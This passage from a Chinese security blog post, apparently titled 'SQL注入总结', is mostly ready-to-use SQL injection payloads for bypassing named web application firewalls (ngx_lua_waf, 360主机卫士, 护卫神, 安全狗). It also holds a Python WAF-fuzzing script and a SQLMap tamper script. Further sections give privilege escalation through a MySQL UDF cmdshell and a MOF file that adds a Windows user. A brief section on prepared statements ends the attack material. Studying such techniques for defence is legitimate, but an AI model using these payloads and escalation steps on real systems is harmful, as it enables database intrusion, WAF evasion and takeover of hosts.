+<p><code>mysql_set_charset(&#39;gbk&#39;);$name=mysql_real_escape_string($name);</code></p>
+</li>
+</ul>
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="绕过字符"><a href="#绕过字符" class="headerlink" title="绕过字符"></a>绕过字符</h2><ul>
+<li><p>绕过空格</p>
+<ul>
+<li>%0a(<code>\r</code>)、%0b(<code>\t</code>)、%a0(+)</li>
+</ul>
+</li>
+<li><p>绕过单引号</p>
+<ul>
+<li>编码：Unicode（IIS支持）、Hex</li>
+<li>函数：char</li>
+<li>宽字节</li>
+<li>数字型</li>
+</ul>
+</li>
+<li><p>绕过union</p>
+<ul>
+<li>使用盲注</li>
+</ul>
+</li>
+<li><p>绕过and/or</p>
+<ul>
+<li>&amp;&amp; / ||</li>
+</ul>
+</li>
+<li><p>substring()</p>
+<ul>
+<li>mid() left() right()</li>
+</ul>
+</li>
+<li><p>绕过小括号</p>
+<ul>
+<li><code>?username=admin&#39; and password binary regexp &#39;^A&#39;</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="绕过ngx-lua-waf"><a href="#绕过ngx-lua-waf" class="headerlink" title="绕过ngx_lua_waf"></a>绕过ngx_lua_waf</h2><p>详细请参考<a href="https://www.t00ls.net/articles-45736.html" target="_blank" rel="noopener">Bypass ngx_lua_waf SQL注入防御（多姿势）</a></p>
+<h3 id="HTTP-参数污染（HPP）"><a href="#HTTP-参数污染（HPP）" class="headerlink" title="HTTP 参数污染（HPP）"></a>HTTP 参数污染（HPP）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.8.147/test/sql.aspx</span><br><span class="line">?id=1 UNION/&amp;ID=/SELECT null,name,null/&amp;Id=/FROM master.dbo.sysdatabases</span><br></pre></td></tr></table></figure>
+<h3 id="URI参数溢出"><a href="#URI参数溢出" class="headerlink" title="URI参数溢出"></a>URI参数溢出</h3><p>提交100个以上参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.128/test.php</span><br><span class="line"></span><br><span class="line">POST：id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp; id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1 union select 1,2,schema_name %0a/*!from*/information_schema.SCHEMATA</span><br></pre></td></tr></table></figure></p>
+<p>MSSQL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.128/test.aspx</span><br><span class="line"></span><br><span class="line">POST：id=1/*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*/ union select null,table_name,null from INFOMATION_SCHEMA.tables</span><br></pre></td></tr></table></figure></p>
+<h2 id="绕过360主机卫士"><a href="#绕过360主机卫士" class="headerlink" title="绕过360主机卫士"></a>绕过360主机卫士</h2><p>详细请参考<a href="https://www.t00ls.net/articles-45943.html" target="_blank" rel="noopener">Bypass 360主机卫士SQL注入防御（多姿势）</a></p>
+<h3 id="利用默认白名单"><a href="#利用默认白名单" class="headerlink" title="利用默认白名单"></a>利用默认白名单</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.php/1.png?id=1 union select 1,2,schema_name from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure>
+<h3 id="利用静态资源"><a href="#利用静态资源" class="headerlink" title="利用静态资源"></a>利用静态资源</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.php/1.png?id=1 union select 1,2,schema_name from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure>
+<h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) union select 1,2,schema_name from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure>
+<h3 id="URI参数溢出-1"><a href="#URI参数溢出-1" class="headerlink" title="URI参数溢出"></a>URI参数溢出</h3><p>同ngx_lua_waf</p>
+<h3 id="GET-POST"><a href="#GET-POST" class="headerlink" title="GET+POST"></a>GET+POST</h3><p>提交POST请求时，忽略GET请求中的参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.132/sql.aspx?id=1 and 1=2 union select 1,column_name,3 from information_schema.columns</span><br><span class="line"></span><br><span class="line">POST：aaa</span><br></pre></td></tr></table></figure>
+<h3 id="multipart-form-data"><a href="#multipart-form-data" class="headerlink" title="multipart/form-data"></a>multipart/form-data</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryACZoaLJJzUwc4hYM</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line">1 union /*!select*/ 1,2,schema_name</span><br><span class="line">from information_schema.SCHEMATA</span><br><span class="line">------WebKitFormBoundaryACZoaLJJzUwc4hYM--</span><br></pre></td></tr></table></figure>
+<h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><p>直接用fuzz脚本，结合注释、空格绕过和<code>/*!*/</code>进行绕过：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://test.com/index.php?id=1"</span></span><br><span class="line">Fuzz_a = [ <span class="string">'/*!'</span>, <span class="string">'*/'</span>, <span class="string">'/**/'</span>, <span class="string">'/'</span>, <span class="string">'?'</span>, <span class="string">'~'</span>, <span class="string">'!'</span>, <span class="string">'.'</span>, <span class="string">'%'</span>, <span class="string">'-'</span>, <span class="string">'*'</span>, <span class="string">'+'</span>, <span class="string">'='</span>]</span><br><span class="line">Fuzz_b = [<span class="string">''</span>]</span><br><span class="line">Fuzz_c = [<span class="string">'%0a'</span>, <span class="string">'%0b'</span>, <span class="string">'%0c'</span>, <span class="string">'%0d'</span>, <span class="string">'%0e'</span>, <span class="string">'%0f'</span>, <span class="string">'%0h'</span>, <span class="string">'%0i'</span>, <span class="string">'%0j'</span>]</span><br><span class="line">FUZZ = Fuzz_a + Fuzz_b + Fuzz_c</span><br><span class="line"><span class="comment"># 配置fuzz字典</span></span><br><span class="line">header = &#123; <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'</span>&#125;</span><br><span class="line">sql=<span class="string">'union select SCHEMA_NAME,2 from information_schema.SCHEMATA'</span></span><br><span class="line">sql_arr=<span class="string">"/*!&#123;&#125;*/#"</span>.format(sql).split()</span><br><span class="line"><span class="comment"># 设置请求的headers</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> FUZZ:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> FUZZ:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> FUZZ:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> FUZZ:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> FUZZ:</span><br><span class="line">                    fuzz_here=a + b + c + d + e</span><br><span class="line">                    <span class="comment"># RAW: PYLOAD = "/*!union" + fuzz_here + "select 1,2*/#"</span></span><br><span class="line">                    PYLOAD = fuzz_here.join(sql_arr)</span><br><span class="line">                    <span class="comment">#  exit(0)</span></span><br><span class="line">                    urlp = url + PYLOAD</span><br><span class="line">                    res = requests.get(urlp, headers=header)</span><br><span class="line">                    <span class="comment"># 使用for排列组合fuzz字典并请求页面, 因为组合后不一定符合sql语句，所以需要用正常页面特征做判断</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'wait'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                        <span class="keyword">print</span> (<span class="string">"[*]URL:"</span> + urlp + <span class="string">u"过狗！"</span>)</span><br><span class="line">                        <span class="comment"># 如果返回的页面中包含wait字符，则打印并写出过狗payload。</span></span><br></pre></td></tr></table></figure>
+<h2 id="绕过护卫神"><a href="#绕过护卫神" class="headerlink" title="绕过护卫神"></a>绕过护卫神</h2><p>详细请参考<a href="https://www.t00ls.net/articles-46165.html" target="_blank" rel="noopener">Bypass 护卫神SQL注入防御（多姿势）</a></p>
+<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>ASPX:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sql.aspx?id=1%00and 1=2 union select 1,2,column_name from information_schema.columns</span><br></pre></td></tr></table></figure>
+<p>PHP:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sql.php?id=1/*%00*/union select 1,schema_name,3 from information_schema.schemata</span><br></pre></td></tr></table></figure>
+<h3 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h3><p>适用于IIS服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.132/sql.aspx?id=1 and 1=2 union s%u0045lect 1,2,column_name from information_schema.columns</span><br></pre></td></tr></table></figure></p>
+<h3 id="HPP"><a href="#HPP" class="headerlink" title="HPP"></a>HPP</h3><p>ASPX中接受参数顺序为为GET，POST，COOKIE：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.132/sql.aspx?id=1 and 1=2 union/*</span><br><span class="line"></span><br><span class="line">POST：id=*/select 1,column_name,3 from information_schema.columns</span><br></pre></td></tr></table></figure>
+<h3 id="号"><a href="#号" class="headerlink" title="%号"></a>%号</h3><p>IIS+ASP中解析会去掉%：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sql.asp?id=1 and 1=2 un%ion select 1,2,column_name from information_schema.columns</span><br></pre></td></tr></table></figure>
+<h3 id="缓冲区溢出-1"><a href="#缓冲区溢出-1" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><p>同360的缓冲区溢出，(Select 0xA*49099)。</p>
+<h2 id="绕过安全狗"><a href="#绕过安全狗" class="headerlink" title="绕过安全狗"></a>绕过安全狗</h2><p>同360主机卫士的内联注释绕过</p>
+<h2 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h2><p>详见<a href="https://anemone.top/HTTP-HTTP协议复习/">HTTP协议复习</a>分块传输部分</p>
+<h2 id="SQLMap-Tamper写法"><a href="#SQLMap-Tamper写法" class="headerlink" title="SQLMap Tamper写法"></a>SQLMap Tamper写法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload=payload.replace(<span class="string">"UNION ALL SELECT"</span>,<span class="string">"union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"UNION SELECT"</span>,<span class="string">"union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">" FROM "</span>,<span class="string">"/*!%23!@%23$%%5e%26%2a()%60~%0afrOm*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"CONCAT"</span>,<span class="string">"/*!12345CONCAT*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"CAST("</span>,<span class="string">"/*!12345CAST(*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"CASE"</span>,<span class="string">"/*!12345CASE*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"DATABASE()"</span>,<span class="string">"database/**/()"</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+<h1 id="不同用户的权限"><a href="#不同用户的权限" class="headerlink" title="不同用户的权限"></a>不同用户的权限</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>普通用户有information_schema表的读权限，但没有mysql表的读权限</p>
+<h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><p>很复杂，详细看<a href="https://paper.tuisec.win/detail/9146d3bd2335703" target="_blank" rel="noopener">深秋之夜360面试有感</a></p>
+<h1 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h1><p>需要解除<code>secure-file-priv=</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'文件内容'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'文件路径'</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'文件内容'</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'文件路径'</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="用户自定义函数提权（UDF）"><a href="#用户自定义函数提权（UDF）" class="headerlink" title="用户自定义函数提权（UDF）"></a>用户自定义函数提权（UDF）</h2><h3 id="获取UDF-dll的hex编码"><a href="#获取UDF-dll的hex编码" class="headerlink" title="获取UDF.dll的hex编码"></a>获取UDF.dll的hex编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(%USER%\\Desktop\\udf.dll)) into dumpfile &apos;%USER%\\Desktop\\udf.txt&apos;;</span><br></pre></td></tr></table></figure>
+<h3 id="保存udf-dll到目标主机"><a href="#保存udf-dll到目标主机" class="headerlink" title="保存udf.dll到目标主机"></a>保存udf.dll到目标主机</h3><p>若数据库版本为5.0以下将其保存到<code>C:\Windows\</code>或<code>C:\Windows\System32\</code>，否则保存到<code>@@basedir\lib\plugin\</code></p>
+<p>使用<code>select &#39;xxx&#39; into dumpfile &#39;C:/MySQL/lib/plugin/::$INDEX_ALLOCATION&#39;;</code>新建文件夹(这里我没成功，网上说确实不成功)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Temp_udf(udf BLOB);</span><br><span class="line">INSERT into Temp_udf values (unhex(&apos;$shellcode&apos;));   #$shellcode为hex(udf.dll)</span><br><span class="line">SELECT udf FROM Temp_udf INTO DUMPFILE &apos;C:/MySQL/lib/plugin/udf.dll&apos;;</span><br></pre></td></tr></table></figure>
+<h3 id="使用用户函数提权"><a href="#使用用户函数提权" class="headerlink" title="使用用户函数提权"></a>使用用户函数提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &apos;udf.dll&apos;;  #此处不能填绝对路径 只能是dll名</span><br><span class="line">select * from mysql.func;                  #看看cmdshell function是否创立，创立就继续</span><br><span class="line">select hex(cmdshell(&apos;whoami&apos;));            #运行各种命令提权</span><br></pre></td></tr></table></figure>
+<h2 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h2><p>由于<strong>c:/windows/system32/wbem/mof/</strong>目录下的 <strong>nullevt.mof</strong> 文件，每分钟都会在一个特定的时间去执行一次，因此可以使用dumpfile将shell写入，然后由系统执行（有点像linux的crontab）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line"> </span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">    Name  = &quot;filtP2&quot;;</span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">    QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">    Name = &quot;consPCSV2&quot;;</span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">    ScriptText =</span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user anemone /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">    Consumer   = $Consumer;</span><br><span class="line">    Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>上传之后用mysql写文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;c:/www/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;</span><br></pre></td></tr></table></figure>
+<h1 id="防御——使用预编译语句"><a href="#防御——使用预编译语句" class="headerlink" title="防御——使用预编译语句"></a>防御——使用预编译语句</h1><p>预先编译sql，后面的注入语句只能做普通字符串查询，预编译语句不能用于orderby</p>
+<p>SQL写法：</p>
+<ol>
+<li><p>预编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prepare ins from &apos;insert into t select ?,?&apos;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @a=999,@b=&apos;hello&apos;;</span><br><span class="line">execute ins using @a,@b;</span><br><span class="line">select * from t;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>释放</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deallocate prepare ins;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>三次交互：</p>
+<p><img src="/sqli-SQL注入总结/1551840783777.png" alt="1551840783777"></p>
+<p>Python写法，python并不支持MySQL的预编译语句（第三方库oursql支持），只是将字符串转义后放到数据库查询：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cursor.execute(<span class="string">'insert into user (name,password) value (%s,%s)'</span>,(name,password))</span><br></pre></td></tr></table></figure>
+<p>Java写法，需要开启预编译功能（useServerPrepStmts=true），程序与数据库3次交互prepare-&gt;execute-&gt;close stmt</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class.forName(name);<span class="comment">//指定连接类型</span></span><br><span class="line">    conn = DriverManager.getConnection(url, user, password);<span class="comment">//获取连接</span></span><br><span class="line">    pst = conn.prepareStatement(<span class="string">"SELECT * FROM users WHERE `name`=?"</span>);<span class="comment">//准备执行语句</span></span><br><span class="line">    pst.setString(<span class="number">1</span>,<span class="string">"9ian1i"</span>);</span><br><span class="line">    rs = pst.executeQuery();</span><br><span class="line">    <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">        String name = rs.getString(<span class="string">"name"</span>);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>php写法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'test'</span>);</span><br><span class="line">$mysqli_stmt=$mysqli-&gt;prepare(<span class="string">"select username, password from test where username=?"</span>);</span><br><span class="line">$mysqli_stmt-&gt;bind_param(<span class="string">'s'</span>, $name);</span><br><span class="line">$mysqli_stmt-&gt;execute();</span><br><span class="line">$mysqli_stmt-&gt;bind_result($username, $password);</span><br><span class="line"><span class="keyword">while</span>($mysqli_stmt-&gt;fetch())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$username--$password"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><p>十种MySQL报错注入，<a href="https://www.cnblogs.com/xishaonian/p/6102750.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/6102750.html</a></p>
+</li>
+<li><p>深入探究宽字节注入漏洞与修补原理，<a href="https://blog.csdn.net/qq_29419013/article/details/81205291" target="_blank" rel="noopener">https://blog.csdn.net/qq_29419013/article/details/81205291</a> </p>
+</li>
+<li><p>Bypass ngx_lua_waf SQL注入防御（多姿势），<a href="https://www.t00ls.net/articles-45736.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-45736.html</a></p>
+</li>
+<li><p>Bypass 360主机卫士SQL注入防御（多姿势），<a href="https://www.t00ls.net/articles-45943.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-45943.html</a></p>
+</li>
+<li><p>Bypass 护卫神SQL注入防御（多姿势），<a href="https://www.t00ls.net/articles-46165.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-46165.html</a> </p>
+</li>
+<li><p>深秋之夜360面试有感，<a href="https://paper.tuisec.win/detail/9146d3bd2335703" target="_blank" rel="noopener">https://paper.tuisec.win/detail/9146d3bd2335703</a></p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Anemone</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://anemone.top/sqli-SQL注入总结/" title="SQL注入总结">http://anemone.top/sqli-SQL注入总结/</a>
+  </li>
+  <li class="post-copyright-license">
